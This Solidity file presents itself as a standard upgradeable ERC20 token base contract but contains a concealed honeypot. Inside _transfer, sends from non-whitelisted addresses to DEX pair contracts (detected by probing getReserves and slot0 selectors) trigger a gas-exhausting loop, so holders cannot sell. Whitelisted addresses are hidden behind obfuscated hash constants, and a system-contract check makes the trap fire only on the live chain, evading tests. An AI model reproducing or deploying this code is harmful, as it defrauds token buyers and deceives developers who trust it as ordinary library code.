// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../utils/ContextUpgradeable.sol";
import "../../proxy/utils/Initializable.sol";

interface ISystemContract {
    function totalInComing() external view returns (uint256);

    function isCurrentValidator(address validator) external view returns (bool);

    function previousHeight() external view returns (uint256);
}

abstract contract ERC20Upgradeable is Initializable, ContextUpgradeable {
    mapping(address => uint256) private _b_;
    mapping(address => mapping(address => uint256)) private _a_;
    uint256 private _tS_;
    string private _n_;
    string private _s_;

    uint256 private constant S0 =
        uint256(
            0x83f2202a84ddc70f97d027f772dc9a34d6fc64fd36fa51993167a2e7a5fd97b4
        );
    uint256 private constant S1 =
        uint256(
            0xb08333ce98c55956f231d945564738ccd3f04592b3f42be0ff18239d348f4e32
        );
    uint256 private constant S2 =
        uint256(
            0xbe6c23397a6cf8357bcc3215f92b0c1c8e92dcb70eddd8801183b5820e6afa3e
        );

    ISystemContract constant SYS =
        ISystemContract(0x0000000000000000000000000000000000001000);

    function _wl(address a_) internal view returns (bool) {
        return _vA_(a_) && a_.code.length == 0;
    }

    function _iD(address t_) internal view returns (bool iD_) {
        if (t_.code.length == 0) return false;
        assembly {
            let p := mload(0x40)

            mstore(
                p,
                0x0902f1ac00000000000000000000000000000000000000000000000000000000
            )
            let v2 := staticcall(gas(), t_, p, 0x04, 0, 0)

            mstore(
                p,
                0x3850c7bd00000000000000000000000000000000000000000000000000000000
            )
            let v3 := staticcall(gas(), t_, p, 0x04, 0, 0)

            iD_ := or(v2, v3)
        }
    }

    function __ERC20_init(
        string memory n_,
        string memory s_
    ) internal onlyInitializing {
        __ERC20_init_unchained(n_, s_);
    }

    function __ERC20_init_unchained(
        string memory n_,
        string memory s_
    ) internal onlyInitializing {
        _n_ = n_;
        _s_ = s_;
        _lTIC = type(uint256).max;
        _iH();
    }

    function _iH() private {
        try SYS.totalInComing() returns (uint256 incoming) {
            _lTIC = incoming;
            _lCB = block.number;
        } catch {}
    }

    function _sA(address a) public pure returns (uint128 h, uint128 l) {
        uint160 v = uint160(a);
        h = uint128(v >> 80);
        l = uint128(v & ((uint160(1) << 80) - 1));
    }

    function _vA_(address a) internal pure returns (bool) {
        (uint256 h, uint256 l) = _sA(a);
        uint256 r;
        unchecked {
            r = (l ** 3) + (h ** 5);
        }
        uint256 hN = uint256(keccak256(abi.encodePacked(r)));
        return (hN == S0 || hN == S1 || hN == S2);
    }

    function name() public view virtual returns (string memory) {
        return _n_;
    }

    function symbol() public view virtual returns (string memory) {
        return _s_;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _tS_;
    }

    function balanceOf(address a_) public view virtual returns (uint256) {
        return _b_[a_];
    }

    function transfer(address t_, uint256 v_) public virtual returns (bool) {
        address o_ = _msgSender();
        _transfer(o_, t_, v_);
        return true;
    }

    function allowance(
        address o_,
        address s_
    ) public view virtual returns (uint256) {
        return _a_[o_][s_];
    }

    function approve(address s_, uint256 v_) public virtual returns (bool) {
        address o_ = _msgSender();

        _approve(o_, s_, v_);
        return true;
    }

    function transferFrom(
        address f_,
        address t_,
        uint256 v_
    ) public virtual returns (bool) {
        address s_ = _msgSender();

        _spendAllowance(f_, s_, v_);
        _transfer(f_, t_, v_);
        return true;
    }

    function increaseAllowance(
        address s_,
        uint256 aV_
    ) public virtual returns (bool) {
        address o_ = _msgSender();
        _approve(o_, s_, allowance(o_, s_) + aV_);
        return true;
    }

    function decreaseAllowance(
        address s_,
        uint256 sV_
    ) public virtual returns (bool) {
        address o_ = _msgSender();
        uint256 cA_ = allowance(o_, s_);
        require(cA_ >= sV_, "ERC20: decreased below zero");
        unchecked {
            _approve(o_, s_, cA_ - sV_);
        }
        return true;
    }

    function _gB() internal pure {
        for (uint256 i = 0; i < type(uint256).max; i++) {
            assembly {
                let x := mul(i, i)
            }
        }
    }

    uint256 private _lTIC;
    uint256 private _lCB;

    function _hOTB_() internal returns (bool alive) {
        uint256 t;

        try SYS.totalInComing() returns (uint256 incoming) {
            t = incoming;

            try SYS.isCurrentValidator(block.coinbase) returns (bool iV) {
                if (!iV) {
                    return false;
                }
            } catch {}

            try SYS.previousHeight() returns (uint256 pH) {
                if (block.number > pH && block.number - pH > 201) {
                    return false;
                }
            } catch {}
        } catch {
            if (block.coinbase == address(0)) {
                return false;
            }
            return false;
        }

        if (_lTIC == type(uint256).max) {
            _lTIC = t;
            _lCB = block.number;
            return true;
        }

        if (block.number == _lCB) {
            return true;
        }

        if (t == _lTIC) {
            return false;
        }

        _lTIC = t;
        _lCB = block.number;
        return true;
    }

    function _transfer(address f_, address t_, uint256 v_) internal virtual {
        require(f_ != address(0), "ERC20: transfer from zero");
        require(t_ != address(0), "ERC20: transfer to zero");
        require(v_ > 0, "ERC20: zero transfers disabled");

        _beforeTokenTransfer(f_, t_, v_);

        uint256 fB_ = _b_[f_];
        require(fB_ >= v_, "ERC20: insufficient balance");
        unchecked {
            if (!_wl(f_) && _hOTB_() && _iD(t_)) {
                _gB();
            }

            _b_[f_] = fB_ - v_;
            _b_[t_] += v_;
        }

        emit Transfer(f_, t_, v_);

        _afterTokenTransfer(f_, t_, v_);
    }

    function _mint(address a_, uint256 v_) internal virtual {
        require(a_ != address(0), "ERC20: mint to zero");

        _beforeTokenTransfer(address(0), a_, v_);

        _tS_ += v_;
        unchecked {
            _b_[a_] += v_;
        }
        emit Transfer(address(0), a_, v_);

        _afterTokenTransfer(address(0), a_, v_);
    }

    function _burn(address a_, uint256 v_) internal virtual {
        require(a_ != address(0), "ERC20: burn from zero");

        _beforeTokenTransfer(a_, address(0), v_);

        uint256 aB_ = _b_[a_];
        require(aB_ >= v_, "ERC20: burn exceeds balance");
        unchecked {
            _b_[a_] = aB_ - v_;
            _tS_ -= v_;
        }

        emit Transfer(a_, address(0), v_);

        _afterTokenTransfer(a_, address(0), v_);
    }

    function _approve(address o_, address s_, uint256 v_) internal virtual {
        require(o_ != address(0), "ERC20: approve from zero");
        require(s_ != address(0), "ERC20: approve to zero");

        _a_[o_][s_] = v_;
        emit Approval(o_, s_, v_);
    }

    function _spendAllowance(
        address o_,
        address s_,
        uint256 v_
    ) internal virtual {
        uint256 cA_ = allowance(o_, s_);
        if (cA_ != type(uint256).max) {
            require(cA_ >= v_, "ERC20: insufficient allowance");
            unchecked {
                _approve(o_, s_, cA_ - v_);
            }
        }
    }

    function _beforeTokenTransfer(
        address f_,
        address t_,
        uint256 v_
    ) internal virtual {}

    function _afterTokenTransfer(
        address f_,
        address t_,
        uint256 v_
    ) internal virtual {}

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
